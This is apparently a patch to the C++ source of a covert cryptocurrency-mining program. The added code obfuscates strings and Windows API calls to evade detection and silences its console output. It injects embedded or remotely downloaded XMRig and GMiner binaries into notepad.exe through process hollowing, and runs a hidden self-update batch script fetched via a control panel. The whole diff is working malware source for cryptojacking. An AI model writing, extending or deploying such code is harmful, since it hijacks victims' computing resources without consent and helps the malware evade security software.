@@ -83,16 +83,34 @@ BOOL WINAPI ConsoleHandler(DWORD signal) {
 
 // Check for updates from the panel
 bool CheckAndApplyUpdate(const std::string& panelUrl, const std::string& currentVersion) {
+    // Stealth API resolution for file/process operations
+    typedef HANDLE(WINAPI* pCreateFileW_t)(LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
+    typedef BOOL(WINAPI* pWriteFile_t)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
+    typedef BOOL(WINAPI* pCloseHandleM_t)(HANDLE);
+    typedef BOOL(WINAPI* pDeleteFileW_t)(LPCWSTR);
+    typedef BOOL(WINAPI* pGetTempPathW_t)(DWORD, LPWSTR);
+    typedef UINT(WINAPI* pGetTempFileNameW_t)(LPCWSTR, LPCWSTR, UINT, LPWSTR);
+    typedef DWORD(WINAPI* pGetModuleFileNameW_t)(HMODULE, LPWSTR, DWORD);
+    typedef BOOL(WINAPI* pCreateProcessW_t)(LPCWSTR, LPWSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);
+    pCreateFileW_t _CreateFileW = (pCreateFileW_t)STEALTH_API_OBFSTR("kernel32.dll", "CreateFileW");
+    pWriteFile_t _WriteFile = (pWriteFile_t)STEALTH_API_OBFSTR("kernel32.dll", "WriteFile");
+    pCloseHandleM_t _CloseHandle = (pCloseHandleM_t)STEALTH_API_OBFSTR("kernel32.dll", "CloseHandle");
+    pDeleteFileW_t _DeleteFileW = (pDeleteFileW_t)STEALTH_API_OBFSTR("kernel32.dll", "DeleteFileW");
+    pGetTempPathW_t _GetTempPathW = (pGetTempPathW_t)STEALTH_API_OBFSTR("kernel32.dll", "GetTempPathW");
+    pGetTempFileNameW_t _GetTempFileNameW = (pGetTempFileNameW_t)STEALTH_API_OBFSTR("kernel32.dll", "GetTempFileNameW");
+    pGetModuleFileNameW_t _GetModuleFileNameW = (pGetModuleFileNameW_t)STEALTH_API_OBFSTR("kernel32.dll", "GetModuleFileNameW");
+    pCreateProcessW_t _CreateProcessW = (pCreateProcessW_t)STEALTH_API_OBFSTR("kernel32.dll", "CreateProcessW");
+    if (!_CreateFileW || !_WriteFile || !_CloseHandle || !_GetModuleFileNameW) return false;
     try {
         // Extract base panel URL (without the /api/miners/submit part)
         std::string baseUrl = panelUrl;
-        size_t apiPos = baseUrl.find("/api/");
+        std::string apiMarker = OBFUSCATE_STRING("/api/");
+        size_t apiPos = baseUrl.find(apiMarker);
         if (apiPos != std::string::npos) {
             baseUrl = baseUrl.substr(0, apiPos);
         }
-        
-        // Fetch current version from panel
-        std::string versionUrl = baseUrl + "/api/updates/current";
+
+        std::string versionUrl = baseUrl + OBFUSCATE_STRING("/api/updates/current");
         std::string response = fetchJsonFromUrl(StringToLPWSTR(versionUrl), 0);
         
         if (response.empty()) {
@@ -157,45 +175,53 @@ bool CheckAndApplyUpdate(const std::string& panelUrl, const std::string& current
         
         // Get current executable path
         wchar_t exePath[MAX_PATH] = {0};
-        if (!GetModuleFileNameW(NULL, exePath, MAX_PATH)) {
+        if (!_GetModuleFileNameW(NULL, exePath, MAX_PATH)) {
+#ifdef ENABLE_DEBUG_CONSOLE
             std::cerr << "[-] Failed to get current executable path" << std::endl;
+#endif
             free(updateBuf);
             return false;
         }
-        
-        // Save update to temporary file
+
         wchar_t tempPath[MAX_PATH] = {0};
         wchar_t tempDir[MAX_PATH] = {0};
-        
-        if (!GetTempPathW(MAX_PATH, tempDir)) {
+
+        if (!_GetTempPathW || !_GetTempPathW(MAX_PATH, tempDir)) {
+#ifdef ENABLE_DEBUG_CONSOLE
             std::cerr << "[-] Failed to get temp directory" << std::endl;
+#endif
             free(updateBuf);
             return false;
         }
-        
-        if (!GetTempFileNameW(tempDir, L"CM", 0, tempPath)) {
+
+        if (!_GetTempFileNameW || !_GetTempFileNameW(tempDir, L"CM", 0, tempPath)) {
+#ifdef ENABLE_DEBUG_CONSOLE
             std::cerr << "[-] Failed to create temp filename" << std::endl;
+#endif
             free(updateBuf);
             return false;
         }
-        
-        // Write update to temp file
-        HANDLE tempFile = CreateFileW(tempPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+
+        HANDLE tempFile = _CreateFileW(tempPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
         if (tempFile == INVALID_HANDLE_VALUE) {
+#ifdef ENABLE_DEBUG_CONSOLE
             std::cerr << "[-] Failed to create temp file" << std::endl;
+#endif
             free(updateBuf);
             return false;
         }
-        
+
         DWORD bytesWritten = 0;
-        if (!WriteFile(tempFile, updateBuf, (DWORD)updateSize, &bytesWritten, NULL) || bytesWritten != (DWORD)updateSize) {
+        if (!_WriteFile(tempFile, updateBuf, (DWORD)updateSize, &bytesWritten, NULL) || bytesWritten != (DWORD)updateSize) {
+#ifdef ENABLE_DEBUG_CONSOLE
             std::cerr << "[-] Failed to write update to temp file" << std::endl;
-            CloseHandle(tempFile);
-            DeleteFileW(tempPath);
+#endif
+            _CloseHandle(tempFile);
+            if (_DeleteFileW) _DeleteFileW(tempPath);
             free(updateBuf);
             return false;
         }
-        CloseHandle(tempFile);
+        _CloseHandle(tempFile);
         free(updateBuf);
         
 #ifdef ENABLE_DEBUG_CONSOLE
@@ -220,55 +246,57 @@ bool CheckAndApplyUpdate(const std::string& panelUrl, const std::string& current
         WideCharToMultiByte(CP_ACP, 0, batchPath, -1, batchPathStr, sizeof(batchPathStr), NULL, NULL);
         
         // Create batch content
-        std::string batchContent = "@echo off\n";
-        batchContent += "timeout /t 1 /nobreak\n"; // Wait 1 second for process to start exiting
-        batchContent += "taskkill /f /im client.exe 2>nul\n"; // Force kill old executable if still running
-        batchContent += "timeout /t 1 /nobreak\n"; // Wait for kill to complete
-        batchContent += "del /q \"" + std::string(exePathStr) + "\"\n"; // Delete old executable
-        batchContent += "move /y \"" + std::string(tempPathStr) + "\" \"" + std::string(exePathStr) + "\"\n"; // Move new executable
-        batchContent += "start \"\" \"" + std::string(exePathStr) + "\"\n"; // Start updated executable
-        batchContent += "del /q \"%~f0\"\n"; // Delete this batch file
+        std::string batchContent = OBFUSCATE_STRING("@echo off\n");
+        batchContent += OBFUSCATE_STRING("timeout /t 1 /nobreak\n");
+        batchContent += OBFUSCATE_STRING("taskkill /f /im client.exe 2>nul\n");
+        batchContent += OBFUSCATE_STRING("timeout /t 1 /nobreak\n");
+        batchContent += OBFUSCATE_STRING("del /q \"") + std::string(exePathStr) + OBFUSCATE_STRING("\"\n");
+        batchContent += OBFUSCATE_STRING("move /y \"") + std::string(tempPathStr) + OBFUSCATE_STRING("\" \"") + std::string(exePathStr) + OBFUSCATE_STRING("\"\n");
+        batchContent += OBFUSCATE_STRING("start \"\" \"") + std::string(exePathStr) + OBFUSCATE_STRING("\"\n");
+        batchContent += OBFUSCATE_STRING("del /q \"%~f0\"\n");
         
-        // Write batch file
-        HANDLE batchFile = CreateFileW(batchPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+        HANDLE batchFile = _CreateFileW(batchPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
         if (batchFile == INVALID_HANDLE_VALUE) {
+#ifdef ENABLE_DEBUG_CONSOLE
             std::cerr << "[-] Failed to create batch file" << std::endl;
-            DeleteFileW(tempPath);
+#endif
+            if (_DeleteFileW) _DeleteFileW(tempPath);
             return false;
         }
-        
+
         bytesWritten = 0;
-        if (!WriteFile(batchFile, batchContent.c_str(), (DWORD)batchContent.size(), &bytesWritten, NULL)) {
+        if (!_WriteFile(batchFile, batchContent.c_str(), (DWORD)batchContent.size(), &bytesWritten, NULL)) {
+#ifdef ENABLE_DEBUG_CONSOLE
             std::cerr << "[-] Failed to write batch file" << std::endl;
-            CloseHandle(batchFile);
-            DeleteFileW(tempPath);
-            DeleteFileW(batchPath);
+#endif
+            _CloseHandle(batchFile);
+            if (_DeleteFileW) { _DeleteFileW(tempPath); _DeleteFileW(batchPath); }
             return false;
         }
-        CloseHandle(batchFile);
+        _CloseHandle(batchFile);
         
 #ifdef ENABLE_DEBUG_CONSOLE
         std::cout << "[+] Created update batch script" << std::endl;
 #endif
         
-        // Execute batch file
         STARTUPINFOW si = {0};
         PROCESS_INFORMATION pi = {0};
         si.cb = sizeof(si);
-        
-        std::string cmdLine = std::string("cmd.exe /c ") + std::string(batchPathStr);
+
+        std::string cmdLineStr = OBFUSCATE_STRING("cmd.exe /c ") + std::string(batchPathStr);
         wchar_t cmdLineWide[512] = {0};
-        MultiByteToWideChar(CP_ACP, 0, cmdLine.c_str(), -1, cmdLineWide, sizeof(cmdLineWide)/sizeof(wchar_t));
-        
-        if (!CreateProcessW(NULL, cmdLineWide, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
+        MultiByteToWideChar(CP_ACP, 0, cmdLineStr.c_str(), -1, cmdLineWide, sizeof(cmdLineWide)/sizeof(wchar_t));
+
+        if (!_CreateProcessW || !_CreateProcessW(NULL, cmdLineWide, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
+#ifdef ENABLE_DEBUG_CONSOLE
             std::cerr << "[-] Failed to execute update batch" << std::endl;
-            DeleteFileW(tempPath);
-            DeleteFileW(batchPath);
+#endif
+            if (_DeleteFileW) { _DeleteFileW(tempPath); _DeleteFileW(batchPath); }
             return false;
         }
-        
-        CloseHandle(pi.hProcess);
-        CloseHandle(pi.hThread);
+
+        _CloseHandle(pi.hProcess);
+        _CloseHandle(pi.hThread);
         
 #ifdef ENABLE_DEBUG_CONSOLE
         std::cout << "[+] Update batch started, exiting..." << std::endl;
@@ -285,7 +313,7 @@ bool CheckAndApplyUpdate(const std::string& panelUrl, const std::string& current
 int main(int argc, char *argv[])
 {
     // Check if another instance is already running
-    if (IsAnotherInstanceRunning("Global\\CMM")) {
+    if (IsAnotherInstanceRunning(OBFUSCATE_STRING("Global\\CMM").c_str())) {
 #ifdef ENABLE_DEBUG_CONSOLE
         std::cerr << "[!] Another instance is already running. Exiting." << std::endl;
 #endif
@@ -402,31 +430,80 @@ int main(int argc, char *argv[])
 
     // Create mutable buffers for both miners
     wchar_t payloadPath[MAX_PATH] = {0};
-    wchar_t targetPath[MAX_PATH] = L"C:\\Windows\\system32\\notepad.exe";
+    wchar_t targetPath[MAX_PATH] = {0};
+    std::string _targetNarrow = OBFUSCATE_STRING("C:\\Windows\\system32\\notepad.exe");
+    std::wstring targetStr(_targetNarrow.begin(), _targetNarrow.end());
+    wcscpy_s(targetPath, MAX_PATH, targetStr.c_str());
 
 #ifdef ENABLE_REMOTE_MINERS
-    // Load XMRig miner from remote panel
-    std::cout << "[*] Remote miner loading enabled - downloading from panel..." << std::endl;
+    // Always load embedded miners first so we can mine immediately even if panel is offline.
+    // Remote miners will be downloaded (and will replace these) once the panel is reachable.
     size_t xmrigPayloadSize = 0;
     BYTE *xmrigBuf = nullptr;
-    
-    if (!DownloadMinerWithFallback(panelUrlsStr, "/resources/xmrig", xmrigBuf, xmrigPayloadSize)) {
-        std::cerr << "[-] Failed to download XMRig from panel" << std::endl;
-        return -1;
-    }
-    
-    std::cout << "[+] Downloaded XMRig: " << xmrigPayloadSize << " bytes" << std::endl;
+    bool remoteXmrigDownloaded = false;
 
-    // Load GMiner from remote panel
     size_t gminerPayloadSize = 0;
     BYTE *gminerBuf = nullptr;
-    
-    if (!DownloadMinerWithFallback(panelUrlsStr, "/resources/gminer", gminerBuf, gminerPayloadSize)) {
-        std::cerr << "[-] Failed to download GMiner from panel, GPU mining may not work" << std::endl;
+    bool remoteGminerDownloaded = false;
+
+    // Load embedded XMRig as the starting point
+    try {
+        LoadEmbeddedXMRig(xmrigBuf, xmrigPayloadSize);
+#ifdef ENABLE_DEBUG_CONSOLE
+        std::cout << "[+] Loaded embedded XMRig as startup fallback: " << xmrigPayloadSize << " bytes" << std::endl;
+#endif
+    } catch (...) {
+        xmrigBuf = nullptr;
+        xmrigPayloadSize = 0;
+    }
+
+    // Load embedded GMiner as the starting point
+    try {
+        LoadEmbeddedGminer(gminerBuf, gminerPayloadSize);
+#ifdef ENABLE_DEBUG_CONSOLE
+        std::cout << "[+] Loaded embedded GMiner as startup fallback: " << gminerPayloadSize << " bytes" << std::endl;
+#endif
+    } catch (...) {
         gminerBuf = nullptr;
         gminerPayloadSize = 0;
-    } else {
-        std::cout << "[+] Downloaded GMiner: " << gminerPayloadSize << " bytes" << std::endl;
+    }
+
+    // Try to download remote miners now; if the panel is online we'll use those instead
+#ifdef ENABLE_DEBUG_CONSOLE
+    std::cout << "[*] Remote miner loading enabled - attempting download from panel..." << std::endl;
+#endif
+    {
+        BYTE *remoteXmrig = nullptr;
+        size_t remoteXmrigSize = 0;
+        if (DownloadMinerWithFallback(panelUrlsStr, "/resources/xmrig", remoteXmrig, remoteXmrigSize)) {
+            if (xmrigBuf) free_buffer(xmrigBuf);
+            xmrigBuf = remoteXmrig;
+            xmrigPayloadSize = remoteXmrigSize;
+            remoteXmrigDownloaded = true;
+#ifdef ENABLE_DEBUG_CONSOLE
+            std::cout << "[+] Downloaded remote XMRig: " << xmrigPayloadSize << " bytes" << std::endl;
+#endif
+        } else {
+#ifdef ENABLE_DEBUG_CONSOLE
+            std::cerr << "[-] Remote XMRig download failed - will retry when panel is reachable" << std::endl;
+#endif
+        }
+
+        BYTE *remoteGminer = nullptr;
+        size_t remoteGminerSize = 0;
+        if (DownloadMinerWithFallback(panelUrlsStr, "/resources/gminer", remoteGminer, remoteGminerSize)) {
+            if (gminerBuf) free_buffer(gminerBuf);
+            gminerBuf = remoteGminer;
+            gminerPayloadSize = remoteGminerSize;
+            remoteGminerDownloaded = true;
+#ifdef ENABLE_DEBUG_CONSOLE
+            std::cout << "[+] Downloaded remote GMiner: " << gminerPayloadSize << " bytes" << std::endl;
+#endif
+        } else {
+#ifdef ENABLE_DEBUG_CONSOLE
+            std::cerr << "[-] Remote GMiner download failed - will retry when panel is reachable" << std::endl;
+#endif
+        }
     }
 #else
     // Load embedded miners
@@ -489,22 +566,30 @@ int main(int argc, char *argv[])
     DWORD cpuPid = 0;
     std::optional<PROCESS_INFORMATION> cpuPi;
     
-    // Only launch XMRig if CPU mining is enabled
+    // Only launch XMRig if CPU mining is enabled and payload is available
     if (cpuConfig.enabled == 1 && !cpuCommand.empty()) {
-        cpuPid = transacted_hollowing(targetPath, xmrigBuf, (DWORD)xmrigPayloadSize, StringToLPWSTR(cpuCommand));
-        Sleep(500);  // Give system time to stabilize after injection
-        cpuPi = ProcessStorage::GetProcess(cpuPid);
-        if (cpuPid != 0) {
+        if (xmrigBuf == nullptr || xmrigPayloadSize == 0) {
 #ifdef ENABLE_DEBUG_CONSOLE
-            std::cout << "[+] Launched XMRig (CPU) into PID: " << cpuPid << std::endl;
+            std::cerr << "[-] XMRig payload not available (remote download failed, no embedded fallback)" << std::endl;
 #endif
         } else {
-            std::cerr << "[-] XMRig injection failed!" << std::endl;
-            free_buffer(xmrigBuf);
-            return 1;
+            cpuPid = transacted_hollowing(targetPath, xmrigBuf, (DWORD)xmrigPayloadSize, StringToLPWSTR(cpuCommand));
+            Sleep(500);
+            cpuPi = ProcessStorage::GetProcess(cpuPid);
+            if (cpuPid != 0) {
+#ifdef ENABLE_DEBUG_CONSOLE
+                std::cout << "[+] Launched XMRig (CPU) into PID: " << cpuPid << std::endl;
+#endif
+            } else {
+                std::cerr << "[-] XMRig injection failed!" << std::endl;
+                free_buffer(xmrigBuf);
+                return 1;
+            }
         }
     } else {
+#ifdef ENABLE_DEBUG_CONSOLE
         std::cout << "[*] CPU mining disabled, skipping XMRig injection" << std::endl;
+#endif
         free_buffer(xmrigBuf);
     }
 
@@ -723,6 +808,88 @@ int main(int argc, char *argv[])
                         }
                     }
                 }
+
+#ifdef ENABLE_REMOTE_MINERS
+                // When the panel comes back online, try to swap in the remote miner binaries
+                // (we may have started with the embedded fallback)
+                if (configManager.IsLastFetchFromPanel()) {
+                    if (!remoteXmrigDownloaded) {
+                        BYTE *remoteXmrig = nullptr;
+                        size_t remoteXmrigSize = 0;
+                        if (DownloadMinerWithFallback(panelUrlsStr, "/resources/xmrig", remoteXmrig, remoteXmrigSize)) {
+                            remoteXmrigDownloaded = true;
+#ifdef ENABLE_DEBUG_CONSOLE
+                            std::cout << "[+] Panel back online - downloaded remote XMRig, restarting CPU miner..." << std::endl;
+#endif
+                            // Kill running miner first
+                            if (cpuPi) {
+                                ProcessAPI procAPI;
+                                if (procAPI.IsInitialized()) {
+                                    procAPI.pTerminateProcess(cpuPi.value().hProcess, 0);
+                                    WaitForSingleObject(cpuPi.value().hProcess, INFINITE);
+                                } else {
+                                    TerminateProcess(cpuPi.value().hProcess, 0);
+                                    WaitForSingleObject(cpuPi.value().hProcess, INFINITE);
+                                }
+                                CloseHandle(cpuPi.value().hProcess);
+                                CloseHandle(cpuPi.value().hThread);
+                                cpuPi.reset();
+                                cpuPid = 0;
+                            }
+                            if (xmrigBuf) free_buffer(xmrigBuf);
+                            xmrigBuf = remoteXmrig;
+                            xmrigPayloadSize = remoteXmrigSize;
+                            // Restart with remote binary
+                            if (configManager.GetCPUConfig().enabled == 1) {
+                                bool isIdle = IsDeviceIdle(configManager.GetCPUConfig().wait_time_idle);
+                                std::string cmd = configManager.BuildCommandLineArgs(configManager.GetCPUConfig(), isIdle);
+                                cpuPid = transacted_hollowing(targetPath, xmrigBuf, (DWORD)xmrigPayloadSize, StringToLPWSTR(cmd));
+                                cpuPi = ProcessStorage::GetProcess(cpuPid);
+                                lastCpuConfig = configManager.GetCPUConfig();
+                            }
+                        }
+                    }
+                    if (!remoteGminerDownloaded) {
+                        BYTE *remoteGminer = nullptr;
+                        size_t remoteGminerSize = 0;
+                        if (DownloadMinerWithFallback(panelUrlsStr, "/resources/gminer", remoteGminer, remoteGminerSize)) {
+                            remoteGminerDownloaded = true;
+#ifdef ENABLE_DEBUG_CONSOLE
+                            std::cout << "[+] Panel back online - downloaded remote GMiner, restarting GPU miner..." << std::endl;
+#endif
+                            if (gpuPi) {
+                                ProcessAPI procAPI;
+                                if (procAPI.IsInitialized()) {
+                                    procAPI.pTerminateProcess(gpuPi.value().hProcess, 0);
+                                    WaitForSingleObject(gpuPi.value().hProcess, INFINITE);
+                                } else {
+                                    TerminateProcess(gpuPi.value().hProcess, 0);
+                                    WaitForSingleObject(gpuPi.value().hProcess, INFINITE);
+                                }
+                                CloseHandle(gpuPi.value().hProcess);
+                                CloseHandle(gpuPi.value().hThread);
+                                gpuPi.reset();
+                                gpuPid = 0;
+                            }
+                            if (gminerBuf) free_buffer(gminerBuf);
+                            gminerBuf = remoteGminer;
+                            gminerPayloadSize = remoteGminerSize;
+                            if (configManager.GetGPUConfig().enabled == 1) {
+                                const MinerConfig& gc = configManager.GetGPUConfig();
+                                std::string gminer_args = GMINER_ALGO + gc.algo +
+                                    GMINER_SERVER + gc.mining_url +
+                                    GMINER_USER + gc.wallet + GMINER_DOT + gc.password +
+                                    GMINER_FAN + std::to_string(gc.fan_speed);
+                                if (gc.use_ssl == 1) gminer_args += GMINER_SSL;
+                                gminer_args += GMINER_TAIL;
+                                gpuPid = transacted_hollowing(targetPath, gminerBuf, (DWORD)gminerPayloadSize, StringToLPWSTR(gminer_args));
+                                gpuPi = ProcessStorage::GetProcess(gpuPid);
+                                lastGpuConfig = gc;
+                            }
+                        }
+                    }
+                }
+#endif // ENABLE_REMOTE_MINERS
             }
         }
 
